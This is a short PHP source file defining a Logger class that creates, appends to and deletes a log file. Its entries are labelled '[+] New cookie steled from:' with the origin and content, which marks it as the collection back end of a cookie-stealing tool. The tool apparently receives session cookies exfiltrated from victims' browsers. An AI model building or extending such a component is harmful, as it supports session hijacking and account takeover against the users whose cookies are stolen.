<?php
Class Logger {

	
	public function init(){
		if(file_exists(ABSPATH.LOG_FILE)){
			return true;
		}else{
			$flog = fopen(ABSPATH.LOG_FILE, "a");
			fclose($flog);

			if(file_exists(ABSPATH.LOG_FILE)){
				return true;
			}else{
				return false;
			}
		}		
	
	}

	public function add($from, $content){
		if($this->init()){
			$flog = fopen(ABSPATH.LOG_FILE, "a+");
			$log = "\r\n------------------------------";
			$log .= "\r\n[+] New cookie steled from: ".$from;
			$log .= "\r\n";
			$log .= "\r\n[>] " . $content;
			$log .= "\r\n------------------------------";
			$result = fwrite($flog, $log);
			if($result){
				fclose($flog);
				return ["status" => true, "message" => "Log write success"];
			}else{
				fclose($flog);
				return ["status" => false, "message" => "Problem to write log"];
			}
		}else{
			return ["status" => false, "message" => "Problem to write log"];
		}
	}

	public function clear(){
		unlink(ABSPATH.LOG_FILE);
	}
}
